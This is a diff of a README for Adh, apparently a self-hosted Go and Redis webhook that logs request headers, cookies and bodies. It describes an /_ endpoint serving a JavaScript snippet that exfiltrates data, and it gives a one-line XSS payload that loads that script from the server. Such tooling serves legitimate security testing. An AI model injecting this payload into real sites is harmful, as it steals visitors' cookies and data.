@@ -1,34 +1,36 @@
+# Adh (Advanced Detailed Hook)
+
 <p align="center">
   <img src="images/logo-light.png" alt="Adh Logo" />
 </p>
 
-This project is nothing innovative or groundbreaking.
-I just wanted to create my own webhook to deploy on a VPS, avoiding dependencies on tools like webhook.site, localtunnel, ngrok, or other similar services. It is fully customizable, and you can use it for various purposes like logging, request handling, or data collection.
+This project was born from the need to have a personal and fully customizable webhook service to deploy on a VPS, without relying on external tools like webhook.site, localtunnel, ngrok, or similar services.
+It offers flexibility for a wide range of use cases, such as request logging, payload inspection, or data collection, making it a versatile tool for developers and cybersecurity professionals alike.
 
-### Overview
+### 🧩 Overview
 
 The core of this project is a simple webhook server that listens for incoming HTTP requests, logs the relevant information, and stores request data in Redis. It is built with Go for the backend and uses Redis for storage. The project aims to be lightweight, flexible, and simple to set up, but with room for expansion (such as adding a dashboard).
 
 ![img](images/adh-schema.png)
 
-### Features
+### 🚀 Features
 
 - **Data Logging**: Logs requests including headers, cookies, body content, and user agent.
 - **Redis Integration**: Store incoming request data in Redis, making it easy to scale or manage.
-- **Exploit Script**: Serve a simple exploit script for XSS attacks (stealed from xss.report).
+- **XSS Exploit Script**: Serve a simple exploit script for XSS attacks (stealed from xss.report).
 - **High customizability**: Customize the server to fit your needs.
-- **Search Bar**: Add a search bar for requests with ***RedisSearch syntax***.
+- **Search Bar Support**: Add a search bar for requests with ***RedisSearch syntax***.
 
-### Dashboard
+### 📊 Dashboard
 
 Below are some screenshots of the dashboard:
 
-| ![Dashboard1](images/adh-dashboard1.png) | ![Dashboard2](images/adh-dashboard2.png) |
+| ![Dashboard1](images/adh-dashboard-1.png) | ![Dashboard2](images/adh-dashboard-2.png) |
 |-------------------------------------------|-------------------------------------------|
-| ![Dashboard3](images/adh-dashboard3.png) | ![Dashboard4](images/adh-dashboard4.png) |
+| ![Dashboard3](images/adh-dashboard-3.png) | ![Dashboard4](images/adh-dashboard-4.png) |
 
 
-### Installation
+### ⚙️ Installation
 
 To get started with the Adh, follow the steps below:
 
@@ -77,7 +79,7 @@ http://localhost:8000
 
 The server will now be accepting requests on the specified port (8000 by default).
 
-### Configuration
+### 🛠 Configuration
 
 The following environment variables are available for customization:
 
@@ -91,33 +93,37 @@ The following environment variables are available for customization:
 - **USER_PASS**: User password for the application. Defaults to `Admin`.
 - **SECRET_KEY**: Secret key for the application. Defaults to `secret`.
 
-### Health Check
+### 🔍 Health Check
 
-The Redis health check is handled by a background goroutine that pings Redis periodically to ensure it's available. The health status is reported through a channel, and you can customize the interval as needed.
+A background goroutine regularly pings Redis to ensure availability, reporting status via an internal channel. The check interval is configurable.
 
-### Log Storage
+### 📁 Log Storage
 
 The application saves all logs to a folder on your host machine. The logs are stored in the `./adh-webhook/logs` directory on your host system, ensuring that the logs persist even when the container is restarted or destroyed. This is done via Docker bind mounts, which map the `./adh-webhook/logs` folder on your local machine to `/var/log/webhook` in the container.
 
-### Example Request
+### 🧪  Example Request
 
-You can send a test request to the webhook with tools like `curl`:
+Try sending a POST request:
 
 ```bash
 curl -X POST http://localhost:8000 -H "Content-Type: application/json" -d '{"key":"value"}'
 ```
 
-### XSS Script
+### 🐛  XSS Script
 
-In the path `/_`, the server returns a JS script which sends a request to the server (to be modified in case it is not localhost:8000) with data in a particular way.
+Available at the /_ endpoint, Adh serves a JavaScript snippet (inspired by xss.report) that exfiltrates data via a request to your server.
 
-The script is *‘stolen’* from xss.report
+Example payload:
 
-A simple payload for get an xss is `<script src="http://localhost:8000/_"></script>`
+```js
+<script src="http://localhost:8000/_"></script>
+```
 
-### To-Do
+Customize the domain in the script if running Adh on a different host.
 
-- [x] **Dashboard**: The current project lacks a UI dashboard to visualize requests and data. This will be added in the future (In progess).
+### 📌 To-Do
+
+- [x] **Dashboard**: The current project lacks a UI dashboard to visualize requests and data. This will be added in the future.
 - [x] **Authentication**: Implement an authentication mechanism to restrict access to the webhook dashboard.
 - [x] Fix http problem with Docker
 - [x] Implement rate limiting to prevent abuse
@@ -125,16 +131,14 @@ A simple payload for get an xss is `<script src="http://localhost:8000/_"></scri
 - [x] Add search bar for requests
 - [x] Add clear button
 
-### Contributing
+### 🤝 Contributing
 
-Contributions are welcome! Feel free to fork the repository, create issues, and submit pull requests.
+Pull requests, issues, and forks are welcome! If you have an idea or fix, feel free to contribute.
 
-### License
+### 📝 License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
 
----
+### 📎 Conclusion
 
-### Conclusion
-
-The Adh Webhook is a flexible and lightweight solution for managing incoming webhooks with custom logging and Redis storage. It's easily deployable with Docker and offers the flexibility to customize headers, storage, and more.
+Adh is a self-hosted, fast, and flexible solution for managing and inspecting HTTP requests in real time. Whether you're debugging, collecting data, or simulating attacks, Adh is ready to be tailored to your workflow.
